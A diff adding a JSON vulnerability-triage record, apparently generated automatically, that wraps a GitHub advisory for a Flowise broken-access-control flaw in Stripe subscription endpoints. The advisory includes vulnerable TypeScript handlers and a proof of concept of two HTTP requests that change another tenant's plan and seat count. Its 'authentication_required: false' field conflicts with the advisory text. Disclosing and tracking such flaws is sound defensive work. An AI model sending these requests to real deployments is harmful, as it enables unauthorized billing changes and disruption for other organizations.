@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/30373481?v=4\", \"events_url\": \"https://api.github.com/users/berkdedekarginoglu/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/berkdedekarginoglu/followers\", \"following_url\": \"https://api.github.com/users/berkdedekarginoglu/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/berkdedekarginoglu/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/berkdedekarginoglu\", \"id\": 30373481, \"login\": \"berkdedekarginoglu\", \"node_id\": \"MDQ6VXNlcjMwMzczNDgx\", \"organizations_url\": \"https://api.github.com/users/berkdedekarginoglu/orgs\", \"received_events_url\": \"https://api.github.com/users/berkdedekarginoglu/received_events\", \"repos_url\": \"https://api.github.com/users/berkdedekarginoglu/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/berkdedekarginoglu/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/berkdedekarginoglu/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/berkdedekarginoglu\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-70476\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 8.3, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-284\", \"name\": \"Improper Access Control\"}, {\"cwe_id\": \"CWE-639\", \"name\": \"Authorization Bypass Through User-Controlled Key\"}], \"description\": \"### Summary\\nSeveral organization billing endpoints accept attacker-controlled Stripe identifiers (subscriptionId) without verifying that the identifier belongs to the authenticated user's organization. This allows an authenticated attacker to perform unauthorized Stripe subscription operations on other tenants. As a result, an authenticated user can manipulate the Stripe subscription of another organization by supplying a victim organization's subscriptionId.\\n\\nThis allows attackers to perform unauthorized billing operations such as changing subscription plans or modifying seat quantities, resulting in potential financial impact and service disruption.\\n\\n\\n### Details\\nMultiple organization billing endpoints accept subscriptionId directly from user input without validating ownership. The server relies on a client-supplied Stripe subscription identifier rather than resolving the subscription from the authenticated user's organization context.\\n\\n**File**\\n\\npackages/server/src/enterprise/routes/organization.route.ts\\n\\nAffected routes:\\n\\n```typescript\\nrouter.post('/update-additional-seats', organizationController.updateAdditionalSeats)\\nrouter.post('/update-subscription-plan', organizationController.updateSubscriptionPlan)\\nupdateSubscriptionPlan\\n```\\n\\n**File**\\n\\npackages/server/src/enterprise/controllers/organization.controller.ts\\n\\n```typescript\\npublic async updateSubscriptionPlan(req: Request, res: Response, next: NextFunction) {\\n    const { subscriptionId, newPlanId, prorationDate } = req.body\\n\\n    const identityManager = getRunningExpressApp().identityManager\\n\\n    const result = await identityManager.updateSubscriptionPlan(\\n        req,\\n        subscriptionId,\\n        newPlanId,\\n        prorationDate\\n    )\\n\\n    return res.status(StatusCodes.OK).json(result)\\n}\\n```\\n\\nThe server trusts the user-supplied subscriptionId and forwards it to the Stripe integration layer.\\n\\nMissing validation:\\nsubscriptionId belongs to req.user.activeOrganization\\n\\nupdateAdditionalSeats\\n\\n```typescript\\npublic async updateAdditionalSeats(req: Request, res: Response, next: NextFunction) {\\n    const { subscriptionId, quantity, prorationDate } = req.body\\n\\n    const identityManager = getRunningExpressApp().identityManager\\n\\n    const result = await identityManager.updateAdditionalSeats(\\n        subscriptionId,\\n        quantity,\\n        prorationDate\\n    )\\n\\n    return res.status(StatusCodes.OK).json(result)\\n}\\n```\\n\\nAgain, the subscriptionId is taken directly from the request body without verifying ownership.\\n\\n### PoC\\nStep 1 - Obtain victim subscriptionId\\n\\nThis identifier may be obtained via the organization read endpoint or other exposed references.\\n\\nExample:\\n\\nsub_YYYYYYYYYYYY\\n\\nStep 2 - Modify victim subscription\\n\\n```http\\nPOST /api/v1/organization/update-subscription-plan\\nHost: target.example.com\\nCookie: token=<attacker-session>\\nContent-Type: application/json\\n\\n{\\n  \\\"subscriptionId\\\": \\\"sub_YYYYYYYYYYYY\\\",\\n  \\\"newPlanId\\\": \\\"free_plan_id\\\",\\n  \\\"prorationDate\\\": 1735689600\\n}\\n```\\n\\nStep 3 - Change seat quantity\\n\\n```http\\nPOST /api/v1/organization/update-additional-seats\\nHost: target.example.com\\nCookie: token=<attacker-session>\\nContent-Type: application/json\\n\\n{\\n  \\\"subscriptionId\\\": \\\"sub_YYYYYYYYYYYY\\\",\\n  \\\"quantity\\\": 0,\\n  \\\"prorationDate\\\": 1735689600\\n}\\n```\\n\\n### Impact\\nAn authenticated attacker can manipulate the Stripe subscription of other organizations.\\n\\nPossible consequences include:\\n\\n- Unauthorized subscription upgrades to higher-priced plans\\n- Manipulation of paid seat quantities leading to unintended charges\\n- Service disruption through plan downgrades\\n\\nBecause the vulnerability allows cross-tenant manipulation of billing resources, it represents a high-impact authorization flaw.\", \"ghsa_id\": \"GHSA-gmmw-qg98-6j6p\", \"github_reviewed_at\": \"2026-08-04T19:24:07Z\", \"html_url\": \"https://github.com/advisories/GHSA-gmmw-qg98-6j6p\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-gmmw-qg98-6j6p\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-70476\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-04T19:24:07Z\", \"references\": [\"https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-gmmw-qg98-6j6p\", \"https://github.com/FlowiseAI/Flowise/pull/6321\", \"https://github.com/FlowiseAI/Flowise/commit/4d7899d02ca370a5510406be5c91483085a412f9\", \"https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3\", \"https://github.com/advisories/GHSA-gmmw-qg98-6j6p\"], \"repository_advisory_url\": \"https://api.github.com/repos/FlowiseAI/Flowise/security-advisories/GHSA-gmmw-qg98-6j6p\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/FlowiseAI/Flowise\", \"summary\": \"Flowise: Broken Access Control in Stripe Subscription Endpoints Allows Cross-Tenant Billing Manipulation\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-04T19:24:12Z\", \"url\": \"https://api.github.com/advisories/GHSA-gmmw-qg98-6j6p\", \"vulnerabilities\": [{\"first_patched_version\": \"3.1.3\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"flowise\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.1.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-gmmw-qg98-6j6p",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "flowise: <= 3.1.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-70476"
+    ],
+    "cvss_score": 8.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "flowise"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-08-04T19:37:52.658194Z",
+  "provenance": {
+    "content_sha256": "a4b1f5aa2cbeac754e061e9d3b4eba20faeb87a5831b11a1286d2df19dadf3a7",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-04T19:24:07Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-gmmw-qg98-6j6p",
+  "status": "active",
+  "title": "Flowise: Broken Access Control in Stripe Subscription Endpoints Allows Cross-Tenant Billing Manipulation",
+  "updated_at": "2026-08-04T19:24:12Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-gmmw-qg98-6j6p"
+}
